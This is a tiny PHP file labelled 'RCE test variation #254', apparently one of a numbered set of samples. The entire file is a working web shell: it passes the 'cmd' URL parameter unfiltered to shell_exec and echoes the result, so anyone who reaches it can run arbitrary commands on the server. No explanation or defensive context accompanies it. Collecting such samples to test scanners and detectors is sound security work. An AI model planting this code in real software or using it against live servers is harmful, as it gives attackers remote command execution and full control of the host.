<?php
// RCE test variation #254
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>